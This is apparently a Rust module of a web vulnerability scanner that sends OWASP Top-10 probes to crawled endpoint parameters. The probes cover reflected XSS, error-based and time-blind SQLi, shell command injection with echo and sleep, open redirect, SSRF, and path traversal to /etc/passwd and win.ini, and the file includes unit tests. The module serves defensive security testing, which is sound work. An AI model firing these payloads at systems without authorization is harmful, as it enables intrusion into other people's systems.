//! OWASP Top-10 active probes against discovered endpoints.
//!
//! Subset that's both safe (no destructive payloads, no auth
//! bruteforce) and signal-rich:
//!   - **A03 Injection — reflected XSS**: per-param send a token-
//!     wrapped `<svg/onload>` payload, look for the payload echoed
//!     unencoded in the response body.
//!   - **A03 Injection — SQLi (error-based + blind)**: per-param send `'`
//!     and match common DB error fingerprints (MySQL, PostgreSQL, MSSQL,
//!     Oracle, SQLite); if none surface, fall back to a time-based blind
//!     probe (a DB `sleep` vs a per-param baseline). Low-FP.
//!   - **A03 Injection — command injection**: per-param inject a shell
//!     separator + `echo <token>` (plus a blind `sleep` time-probe). A
//!     HIT needs the token to appear *alone* (the command ran), not the
//!     literal `echo <token>` (mere reflection) — the reflection guard
//!     stops XSS-reflective pages from false-positiving.
//!   - **A04 Insecure Design — open redirect**: per-param send
//!     `https://evil.example.org/`, follow no redirects, check the
//!     response Location header echoes our value.
//!   - **A10 SSRF (best-effort)**: per-param send `http://127.0.0.1:1/`,
//!     match a connection-refused error string in the body. Limited
//!     because most apps don't expose backend errors verbatim.
//!   - **A03 Injection — LFI / path traversal**: per-param send
//!     `../…/etc/passwd` (and Windows `win.ini`) variants, match the
//!     unmistakable `root:x:0:0:` / `[extensions]` signatures. Low-FP.
//!
//! Each finding includes the param it triggered on and the evidence
//! snippet so reviewers can verify by hand.

use crate::web_crawl::{seed_cookie_jar, Endpoint};
use anyhow::Result;
use reqwest::Url;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::time::{Duration, Instant};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OwaspFinding {
    pub category: &'static str,
    pub url: String,
    pub method: String,
    pub param: String,
    pub payload: String,
    pub evidence: String,
}

#[derive(Debug, Clone)]
pub struct ProbeConfig {
    pub timeout: Duration,
    pub checks: Vec<&'static str>, // "xss", "sqli", "redirect", "ssrf", "cmdi", "lfi"
    /// Cookie-header-style string ("PHPSESSID=…; security=low") so the
    /// probes hit the authenticated surface the crawl mapped. Without it
    /// every probe lands on the app's login redirect and finds nothing.
    pub cookie: Option<String>,
}

impl Default for ProbeConfig {
    fn default() -> Self {
        Self {
            timeout: Duration::from_secs(8),
            checks: vec!["xss", "sqli", "redirect", "ssrf", "cmdi", "lfi"],
            cookie: None,
        }
    }
}

const SQL_ERROR_FINGERPRINTS: &[&str] = &[
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "pg_query():",
    "postgresql query failed",
    "sqlite3::sqlexception",
    "ora-00933",
    "ora-01756",
    "microsoft odbc",
    "sqlserver jdbc driver",
    // Expanded engine coverage (v0.101.0): broader MySQL / PostgreSQL /
    // MSSQL / Oracle / DB2 error strings, all low-FP.
    "mysql_fetch_array()",
    "supplied argument is not a valid mysql",
    "syntax error at or near",
    "sqlstate[",
    "ora-00921",
    "ora-00936",
    "incorrect syntax near",
    "microsoft ole db provider for sql server",
    "db2 sql error",
];

/// Signatures that appear only when a path-traversal payload actually read a
/// system file — unmistakable, so the LFI probe stays low-FP.
const LFI_SIGNATURES: &[&str] = &[
    "root:x:0:0:",              // Unix /etc/passwd
    "root:!:0:0:",              // AIX /etc/passwd
    "; for 16-bit app support", // Windows win.ini header
    "[extensions]",             // Windows win.ini section
    "[fonts]",                  // Windows win.ini section
];

pub async fn probe(endpoints: &[Endpoint], cfg: &ProbeConfig) -> Result<Vec<OwaspFinding>> {
    // Carry the crawl's session into the probes. The jar is seeded at each
    // distinct site root (path "/") so the cookie applies to every probed
    // path, not just the one it was first seen on.
    let jar = std::sync::Arc::new(reqwest::cookie::Jar::default());
    if let Some(cookie) = &cfg.cookie {
        let mut seeded = std::collections::HashSet::new();
        for ep in endpoints {
            if let Ok(mut root) = Url::parse(&ep.url) {
                root.set_path("/");
                root.set_query(None);
                root.set_fragment(None);
                if seeded.insert(root.to_string()) {
                    seed_cookie_jar(&jar, cookie, &root);
                }
            }
        }
    }
    let client = reqwest::Client::builder()
        .cookie_provider(std::sync::Arc::clone(&jar))
        .timeout(cfg.timeout)
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::none())
        .user_agent("rustymap/owasp-probes")
        .build()?;

    let mut findings = Vec::new();
    for ep in endpoints {
        if ep.params.is_empty() {
            continue;
        }
        for param in &ep.params {
            if cfg.checks.contains(&"xss") {
                if let Some(f) = test_xss(&client, ep, param).await {
                    findings.push(f);
                }
            }
            if cfg.checks.contains(&"sqli") {
                if let Some(f) = test_sqli(&client, ep, param).await {
                    findings.push(f);
                }
            }
            if cfg.checks.contains(&"redirect") {
                if let Some(f) = test_open_redirect(&client, ep, param).await {
                    findings.push(f);
                }
            }
            if cfg.checks.contains(&"ssrf") {
                if let Some(f) = test_ssrf(&client, ep, param).await {
                    findings.push(f);
                }
            }
            if cfg.checks.contains(&"cmdi") {
                if let Some(f) = test_cmdi(&client, ep, param).await {
                    findings.push(f);
                }
            }
            if cfg.checks.contains(&"lfi") {
                if let Some(f) = test_lfi(&client, ep, param).await {
                    findings.push(f);
                }
            }
        }
    }
    Ok(findings)
}

async fn test_xss(client: &reqwest::Client, ep: &Endpoint, param: &str) -> Option<OwaspFinding> {
    let token = format!("rmxss{}", rand_token());
    let payload = format!("\"><svg/onload=alert('{}')>", token);
    let body = send_with_param(client, ep, param, &payload).await?;
    if body.contains(&payload) || body.contains(&format!("svg/onload=alert('{}')", token)) {
        Some(OwaspFinding {
            category: "A03 Reflected XSS",
            url: ep.url.clone(),
            method: ep.method.clone(),
            param: param.to_string(),
            payload,
            evidence: snippet_around(&body, &token, 80),
        })
    } else {
        None
    }
}

async fn test_sqli(client: &reqwest::Client, ep: &Endpoint, param: &str) -> Option<OwaspFinding> {
    let payload = "'\"`)";
    let body = send_with_param(client, ep, param, payload).await?;
    let lower = body.to_lowercase();
    for fp in SQL_ERROR_FINGERPRINTS {
        if let Some(idx) = lower.find(fp) {
            return Some(OwaspFinding {
                category: "A03 Error-based SQLi",
                url: ep.url.clone(),
                method: ep.method.clone(),
                param: param.to_string(),
                payload: payload.to_string(),
                evidence: body[idx.saturating_sub(20)..(idx + fp.len() + 60).min(body.len())]
                    .to_string(),
            });
        }
    }
    // Blind (time-based) SQLi: if no error string surfaced, see whether a
    // DB-sleep payload delays the response well past a per-param baseline
    // (reuses `measure()` + a baseline, like the CMDi time-probe).
    let sleep_secs = 5u64;
    let baseline = measure(client, ep, param, "1").await?;
    // A bare `' AND SLEEP(..)` short-circuits when the injected value matches no
    // row: `WHERE col='' AND SLEEP(5)` is FALSE-first, so the DB never runs the
    // sleep and the probe sees no delay (lab bug N11, part 2 — the fragment fix
    // alone wasn't enough). A truthy prefix (matching the "1" baseline value)
    // keeps the base comparison satisfiable so the sleep actually fires; the
    // string- and numeric-context forms cover both quoted and unquoted columns.
    const BLIND: &[&str] = &[
        "1' AND SLEEP(5)-- -",          // MySQL / MariaDB, string context
        "1 AND SLEEP(5)",               // MySQL / MariaDB, numeric context
        "1' AND pg_sleep(5)-- -",       // PostgreSQL, string context
        "1 AND pg_sleep(5)",            // PostgreSQL, numeric context
        "'; WAITFOR DELAY '0:0:5'-- ",  // MSSQL (stacked — runs unconditionally)
    ];
    for payload in BLIND {
        if let Some(elapsed) = measure(client, ep, param, payload).await {
            if elapsed >= baseline + Duration::from_secs(sleep_secs - 1) {
                return Some(OwaspFinding {
                    category: "A03 Blind SQLi (time-based)",
                    url: ep.url.clone(),
                    method: ep.method.clone(),
                    param: param.to_string(),
                    payload: payload.to_string(),
                    evidence: format!(
                        "response delayed to {:.1}s vs {:.1}s baseline",
                        elapsed.as_secs_f64(),
                        baseline.as_secs_f64()
                    ),
                });
            }
        }
    }
    None
}

async fn test_open_redirect(
    client: &reqwest::Client,
    ep: &Endpoint,
    param: &str,
) -> Option<OwaspFinding> {
    let payload = "https://evil.example.org/";
    let resp = send_with_param_resp(client, ep, param, payload).await?;
    let status = resp.status().as_u16();
    if !(300..400).contains(&status) {
        return None;
    }
    let loc = resp.headers().get("location")?.to_str().ok()?.to_string();
    if loc.starts_with("https://evil.example.org") || loc.starts_with("//evil.example.org") {
        Some(OwaspFinding {
            category: "A04 Open Redirect",
            url: ep.url.clone(),
            method: ep.method.clone(),
            param: param.to_string(),
            payload: payload.to_string(),
            evidence: format!("Location: {}", loc),
        })
    } else {
        None
    }
}

async fn test_ssrf(client: &reqwest::Client, ep: &Endpoint, param: &str) -> Option<OwaspFinding> {
    let payload = "http://127.0.0.1:1/";
    let body = send_with_param(client, ep, param, payload).await?;
    let lower = body.to_lowercase();
    // No "127.0.0.1:1" marker: the payload itself contains it, so merely
    // reflecting our input would false-positive. We match only backend
    // connection-failure strings, which prove the server tried to reach us.
    let markers = [
        "connection refused",
        "failed to connect",
        "couldn't connect",
        "no route to host",
    ];
    for m in markers {
        if let Some(idx) = lower.find(m) {
            return Some(OwaspFinding {
                category: "A10 SSRF (suspected)",
                url: ep.url.clone(),
                method: ep.method.clone(),
                param: param.to_string(),
                payload: payload.to_string(),
                evidence: body[idx.saturating_sub(20)..(idx + m.len() + 60).min(body.len())]
                    .to_string(),
            });
        }
    }
    None
}

async fn test_cmdi(client: &reqwest::Client, ep: &Endpoint, param: &str) -> Option<OwaspFinding> {
    let token = format!("rmci{}", rand_token());
    // Marker-based: a shell separator + `echo <token>`. If the value is
    // interpolated into a shell command the token prints on its own; if the
    // app merely reflects our input the literal `echo <token>` comes back,
    // which `cmdi_hit` rejects as reflection, not execution.
    for sep in [";", "|", "`"] {
        let payload = if sep == "`" {
            format!("`echo {}`", token)
        } else {
            format!("{} echo {}", sep, token)
        };
        if let Some(body) = send_with_param(client, ep, param, &payload).await {
            if cmdi_hit(&body, &token) {
                return Some(OwaspFinding {
                    category: "A03 Command Injection",
                    url: ep.url.clone(),
                    method: ep.method.clone(),
                    param: param.to_string(),
                    payload,
                    evidence: snippet_around(&body, &token, 80),
                });
            }
        }
    }
    // Blind/time-based: inject a sleep and compare against a baseline. A
    // genuine injection delays the response by ~the sleep; a reflected or
    // ignored payload returns at baseline speed. Cheap for non-vulnerable
    // params (the sleep never runs, so elapsed stays near baseline).
    let sleep_secs = 5u64;
    let baseline = measure(client, ep, param, "1").await?;
    for sep in [";", "|"] {
        let payload = format!("{} sleep {}", sep, sleep_secs);
        if let Some(elapsed) = measure(client, ep, param, &payload).await {
            if elapsed >= baseline + Duration::from_secs(sleep_secs - 1) {
                return Some(OwaspFinding {
                    category: "A03 Command Injection (time-based)",
                    url: ep.url.clone(),
                    method: ep.method.clone(),
                    param: param.to_string(),
                    payload,
                    evidence: format!(
                        "response delayed to {:.1}s vs {:.1}s baseline",
                        elapsed.as_secs_f64(),
                        baseline.as_secs_f64()
                    ),
                });
            }
        }
    }
    None
}

/// Marker-based command-injection decision: the token must appear in the
/// body (the `echo` ran) but NOT as the literal `echo <token>` — the
/// latter is just our payload reflected (e.g. on an XSS-reflective page),
/// which must not count as a command-injection hit.
fn cmdi_hit(body: &str, token: &str) -> bool {
    body.contains(token) && !body.contains(&format!("echo {}", token))
}

/// Time a single request to `param=value`; `None` if it errors or times out.
async fn measure(
    client: &reqwest::Client,
    ep: &Endpoint,
    param: &str,
    value: &str,
) -> Option<Duration> {
    let start = Instant::now();
    let _ = send_with_param_resp(client, ep, param, value).await?;
    Some(start.elapsed())
}

async fn test_lfi(client: &reqwest::Client, ep: &Endpoint, param: &str) -> Option<OwaspFinding> {
    const PAYLOADS: &[&str] = &[
        "../../../../../../../../etc/passwd",
        "....//....//....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        "../../../../../../../../windows/win.ini",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    ];
    for payload in PAYLOADS {
        if let Some(body) = send_with_param(client, ep, param, payload).await {
            let lower = body.to_lowercase();
            if let Some(sig) = lfi_signature(&lower) {
                let idx = lower.find(sig).unwrap_or(0);
                return Some(OwaspFinding {
                    category: "A03 LFI / Path Traversal",
                    url: ep.url.clone(),
                    method: ep.method.clone(),
                    param: param.to_string(),
                    payload: payload.to_string(),
                    evidence: body[idx.saturating_sub(20)..(idx + sig.len() + 60).min(body.len())]
                        .to_string(),
                });
            }
        }
    }
    None
}

/// The LFI signature present in a (lowercased) body, if any. These strings only
/// appear when a traversal payload actually read a system file, so matching one
/// is high-confidence.
fn lfi_signature(body_lower: &str) -> Option<&'static str> {
    LFI_SIGNATURES.iter().copied().find(|sig| body_lower.contains(sig))
}

async fn send_with_param(
    client: &reqwest::Client,
    ep: &Endpoint,
    param: &str,
    value: &str,
) -> Option<String> {
    let resp = send_with_param_resp(client, ep, param, value).await?;
    resp.text().await.ok()
}

async fn send_with_param_resp(
    client: &reqwest::Client,
    ep: &Endpoint,
    param: &str,
    value: &str,
) -> Option<reqwest::Response> {
    let mut url = Url::parse(&ep.url).ok()?;
    if ep.method == "POST" {
        let mut form: HashMap<String, String> = HashMap::new();
        for p in &ep.params {
            form.insert(p.clone(), if p == param { value.into() } else { "1".into() });
        }
        client.post(url).form(&form).send().await.ok()
    } else {
        // Build the query with EVERY endpoint param, not just those already
        // in the URL. Apps like DVWA gate the query on a sibling field
        // (`isset($_REQUEST['Submit'])`), so a GET that omits it never runs
        // the vulnerable code path — the reason the probes found nothing on
        // authenticated DVWA before this fix.
        let existing: HashMap<String, String> = url
            .query_pairs()
            .map(|(k, v)| (k.into_owned(), v.into_owned()))
            .collect();
        let mut pairs: Vec<(String, String)> = Vec::new();
        let mut seen: HashSet<String> = HashSet::new();
        for p in &ep.params {
            let v = if p == param {
                value.to_string()
            } else {
                existing.get(p).cloned().unwrap_or_else(|| "1".to_string())
            };
            pairs.push((p.clone(), v));
            seen.insert(p.clone());
        }
        // Preserve any pre-existing query params the endpoint list didn't name.
        for (k, v) in &existing {
            if !seen.contains(k) {
                pairs.push((k.clone(), v.clone()));
                seen.insert(k.clone());
            }
        }
        // Ensure the target param is present even if it wasn't in the list.
        if !seen.contains(param) {
            pairs.push((param.to_string(), value.to_string()));
        }
        url.query_pairs_mut().clear().extend_pairs(&pairs);
        client.get(url).send().await.ok()
    }
}

fn rand_token() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let n = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    format!("{:x}", n & 0xffffff)
}

fn snippet_around(body: &str, needle: &str, ctx: usize) -> String {
    if let Some(idx) = body.find(needle) {
        let start = idx.saturating_sub(ctx);
        let end = (idx + needle.len() + ctx).min(body.len());
        body[start..end].to_string()
    } else {
        String::new()
    }
}

pub fn print_findings(findings: &[OwaspFinding]) {
    use colored::*;
    if findings.is_empty() {
        println!("\n{}", "OWASP probes: no findings".green());
        return;
    }
    println!();
    println!("{}", format!("OWASP probes — {} finding(s)", findings.len()).bold());
    for f in findings {
        println!(
            "  {} {} {} param={} payload={}",
            f.category.red().bold(),
            f.method,
            f.url,
            f.param,
            f.payload
        );
        if !f.evidence.is_empty() {
            let snippet: String = f.evidence.chars().take(120).collect();
            println!("    evidence: {}", snippet.replace('\n', " "));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn snippet_returns_window_around_needle() {
        let body = "abcdefg HEY xyzqrs";
        // ctx=4 → start=index-4=4 ("efg "), end=index+3+4=15 (" xyz")
        let s = snippet_around(body, "HEY", 4);
        assert!(s.contains("HEY"));
        assert!(s.contains("efg"));
        assert!(s.contains("xyz"));
    }

    #[test]
    fn sql_fingerprint_lookup_lowercase_safe() {
        let body = "Warning: MySQL syntax error near …";
        let lower = body.to_lowercase();
        assert!(SQL_ERROR_FINGERPRINTS
            .iter()
            .any(|fp| lower.contains(fp)));
    }

    #[test]
    fn cmdi_hit_requires_execution_not_reflection() {
        let token = "rmci1a2b3c";
        // Payload merely reflected (literal "echo <token>" present) → no hit.
        let reflected = format!("You entered: ; echo {}", token);
        assert!(!cmdi_hit(&reflected, token));
        // Backtick payload reflected verbatim → still "echo <token>" → no hit.
        let reflected_bt = format!("arg=`echo {}`", token);
        assert!(!cmdi_hit(&reflected_bt, token));
        // Command actually ran: the token prints on its own → hit.
        let executed = format!("PING output…\n{}\nrtt min/avg", token);
        assert!(cmdi_hit(&executed, token));
        // Token absent entirely → no hit.
        assert!(!cmdi_hit("nothing here", token));
    }

    #[test]
    fn sql_fingerprints_lowercase_and_expanded() {
        // All fingerprints are lowercase (we match a lowercased body).
        assert!(SQL_ERROR_FINGERPRINTS.iter().all(|fp| *fp == fp.to_lowercase()));
        // Coverage expanded past the original MySQL/PG/MSSQL/Oracle/SQLite set.
        assert!(SQL_ERROR_FINGERPRINTS.contains(&"incorrect syntax near"));
        assert!(SQL_ERROR_FINGERPRINTS.contains(&"syntax error at or near"));
        assert!(SQL_ERROR_FINGERPRINTS.len() >= 20);
    }

    #[test]
    fn lfi_signature_matches_passwd_and_winini_only() {
        assert_eq!(
            lfi_signature("root:x:0:0:root:/root:/bin/bash\n"),
            Some("root:x:0:0:")
        );
        assert!(lfi_signature("; for 16-bit app support\n[fonts]\n").is_some());
        assert_eq!(lfi_signature("a totally normal html page"), None);
        // The probe lowercases the body first, so an upper-case passwd still hits.
        assert!(lfi_signature(&"ROOT:X:0:0:".to_lowercase()).is_some());
    }
}
